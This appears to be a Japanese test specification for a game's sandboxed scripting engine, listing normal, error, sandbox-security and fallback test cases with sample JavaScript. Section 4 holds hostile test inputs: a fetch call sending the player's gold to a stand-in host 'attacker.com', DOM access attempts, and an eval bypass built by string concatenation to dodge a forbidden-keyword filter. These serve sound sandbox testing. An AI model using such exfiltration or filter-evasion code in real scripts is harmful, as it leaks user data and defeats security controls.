# プログラマブルアクション: テスト観点と検証パターン仕様

このドキュメントでは、プログラマブルアクション（スクリプト実行エンジンおよび統合ライフサイクル）の品質と安全性を保証するためのテスト設計、具体的な検証シナリオ、およびテストケースについて解説します。

---

## 1. テスト戦略

プログラマブルアクションのテストは、以下の4つの主要カテゴリに分類して実施します。

```
  ┌─────────────────────────────────────────────────────────┐
  │                   テスト・検証カテゴリ                   │
  └────────────────────────────────────────────┬────────────┘
         ┌───────────────┬─────────────────────┼───────────────┐
         ▼               ▼                     ▼               ▼
    【正常系機能】  【異常系・エラー】     【セキュリティ】  【UIフォールバック】
    意図通りの挙動  安全な例外ハンドリング  堅牢な隔離環境    透過的な手動切り替え
```

---

## 2. 正常系テストケース (Happy Path Tests)

スクリプトが正しく動作し、ゲーム状態に基づいて適切な行動コマンドを決定できるかを検証します。

### シナリオ 2.1: 条件分岐による行動選択
* **テストコード**:
  ```javascript
  const hpRate = player.hp / player.maxHp;
  if (hpRate < 0.3) {
      heal();
  } else {
      attack();
  }
  ```
* **検証内容**:
  * プレイヤーのHPが30%未満のとき、`heal` コマンドが選ばれること。
  * プレイヤーのHPが30%以上のとき、`attack` コマンドが選ばれること。
  * いずれの場合も `ScriptExecutionResult.success` が `true` になること。

### シナリオ 2.2: イミュータブル算出プロパティとユーティリティの利用
* **テストコード**:
  ```javascript
  log("My HP rate: " + player.hpRate);
  log("Enemy HP rate: " + enemy.hpRate);
  if (player.inventory.hasPotion()) {
      useItem(player.inventory.getPotions()[0].id);
  } else {
      defend();
  }
  ```
* **検証内容**:
  * 算出プロパティ `player.hpRate` および `enemy.hpRate` が正確な比率を返すこと。
  * ポーションを所持している場合、所持ポーションのIDを用いた `useItem` コマンドが発行されること。
  * ポーションがない場合、`defend` コマンドが発行されること。
  * ユーザースクリプトログにHP比率が正しく記録されていること。

---

## 3. 異常系テストケース (Exception Handling Tests)

不適切なコードやエラーを含むスクリプトが入力された際、ゲームシステム全体がクラッシュせず、安全に回復できるかを検証します。

### シナリオ 3.1: 構文エラー（シンタックスエラー）
* **テストコード**:
  ```javascript
  if (player.hp < 10 { // 閉じ括弧の欠損
      attack();
  }
  ```
* **検証内容**:
  * スクリプト登録時（`setScript` 呼び出し時）に `ActionDecisionService` の `validateSyntax` が `valid: false` を返すこと。
  * エラーメッセージ（例: `Unexpected token '{'`）が取得され、`lastScriptError` に代入されること。
  * スクリプトが無効化され、戦闘時に自動フォールバックが機能すること。

### シナリオ 3.2: 実行時エラー（ランタイムエラー）
* **テストコード**:
  ```javascript
  // 存在しない変数やメソッドの呼び出し
  const x = undefinedVariable.hp;
  attack();
  ```
* **検証内容**:
  * スクリプト実行エンジンが例外を安全にキャッチ（`try-catch`）し、ゲームがフリーズしないこと。
  * `ScriptExecutionResult.success` が `false` になり、エラー内容が `error` フィールドに格納されること。
  * エラー発生時、自動的にUI入力待ちへとフォールバックし、手動でボタン操作が行えること。

### シナリオ 3.3: 非戦闘時の実行制御
* **検証内容**:
  * バトル状態が `'idle'` の状態で `decideAction` を実行した際、スクリプトを実行せずに即座に `null` を返却し終了すること。

---

## 4. セキュリティ・サンドボックス検証 (Security & Sandbox Tests)

悪意あるコードがサンドボックス外（ブラウザ環境）へ侵入したり、ゲーム状態を不正に書き換えたりできないか検証します。

### シナリオ 4.1: DOMおよびグローバルAPIへの不正アクセス
* **テストコード**:
  ```javascript
  window.alert("Hacked!");
  const doc = document;
  fetch("https://attacker.com/steal?gold=" + player.inventory.gold);
  ```
* **検証内容**:
  * `TypeError: Cannot read properties of undefined` もしくはそれに準ずる未定義エラーが発生すること。
  * 外部サーバーへの通信要求が一切発生しないこと。

### シナリオ 4.2: イミュータブルデータの改ざん試行
* **テストコード**:
  ```javascript
  player.hp = 9999;
  player.inventory.gold += 10000;
  enemy.hp = 0;
  ```
* **検証内容**:
  * Strict Mode により、フリーズされたオブジェクトのプロパティへの代入が例外エラーを誘発すること。
  * 例外エラーが発生しない場合（環境依存）であっても、ゲームの実際のメモリ上のHPやゴールドの値が一切変動していないこと。

### シナリオ 4.3: 禁止キーワードの回避試行
* **テストコード**:
  ```javascript
  const malicious = "ev" + "al";
  malicious("window.alert()");
  ```
  ```javascript
  eval("player.hp = 999");
  ```
* **検証内容**:
  * `Forbidden keyword detected in script` で検知されること。
  * 文字列結合などで検知を回避したとしても、サンドボックス環境で `window` 等が `undefined` になっているため、実行時にエラーとなり最終的なハックは失敗すること。

---

## 5. フォールバック検証 (Fallback & Integration Tests)

自動と手動がシームレスに切り替わるか、ゲームループとしての完成度を検証します。

### シナリオ 5.1: コマンド未発行時の振る舞い
* **テストコード**:
  ```javascript
  // ログを出力するだけでコマンドを呼び出さない
  log("Analyzing current state...");
  ```
* **検証内容**:
  * スクリプトは正常終了（`success: true`）するが、`command` は `null` になること。
  * `useBattle` 内で `tryExecuteScript()` が `false` を返し、戦闘画面の「攻撃」「回復」等の操作ボタンが有効（活性化）になり、プレイヤーの入力を促すこと。
